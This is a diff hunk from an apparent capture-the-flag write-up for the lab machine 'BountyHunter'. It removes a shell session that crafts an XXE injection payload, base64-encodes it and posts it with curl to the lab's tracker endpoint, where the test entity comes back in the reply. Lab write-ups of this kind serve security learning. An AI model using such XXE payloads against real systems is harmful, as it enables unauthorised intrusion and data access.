@@ -85,35 +85,6 @@ http://10.10.11.100/ [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], 
 
 **XML External Entity (XXE) Injection**
 
-```
-┌──(nabla㉿kali)-[~]
-└─$ vim xxe_payload.txt
-
-<?xml  version="1.0" encoding="ISO-8859-1"?>
-		<!DOCTYPE bountyhunter [
-		<!ENTITY payload "XXE TEST">
-		]>
-		<bugreport>
-		<title>&payload;</title>
-		<cwe>Test</cwe>
-		<cvss>123</cvss>
-		<reward>1337</reward>
-		</bugreport>
-
-┌──(nabla㉿kali)-[~]
-└─$ payload=$(cat xxe_payload.txt | base64 -w 0)
-
-┌──(nabla㉿kali)-[~]
-└─$ curl 'http://bountyhunter.htb/tracker_diRbPr00f314.php' -X POST --data-urlencode "data=$payload"
-
-[SNIP]
-
-    <td>Title:</td>
-    <td>XXE TEST</td>
-
-[SNIP]
-```
-
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
 		<!DOCTYPE bountyhunter [
